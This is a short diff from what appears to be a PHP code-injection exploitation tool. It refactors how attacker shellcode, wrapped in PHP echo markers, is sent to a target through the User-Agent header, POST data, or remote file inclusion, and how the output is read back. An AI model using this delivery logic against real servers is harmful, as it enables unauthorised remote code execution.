@@ -153,17 +153,10 @@ class codeinjector(baseClass):
                         shellcode = shellcode.replace("__PAYLOAD__", payload)
 
 
-                    userload = "<? echo '%s'; ?> %s <? echo '%s'; ?>" %(rndStart, shellcode, rndEnd)
-
-                    if (mode.find("A") != -1):
-                        self.globSet.setUserAgent(userload)
-                        code = self.doGetRequest(url)
-                    elif (mode.find("P") != -1):
-                        code = self.doPostRequest(url, userload)
-                    elif (mode.find("R") != -1):
-                        code = self.executeRFI(url, appendix, userload)
-
-                    code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
+                    code = self.__doHaxRequest(url, mode, shellcode, appendix)
+                    if (code == None):
+                        print "Exploiting Failed!"
+                        sys.exit(1)
                     print code.strip()
         else:
             print "Failed to test php injection. :("
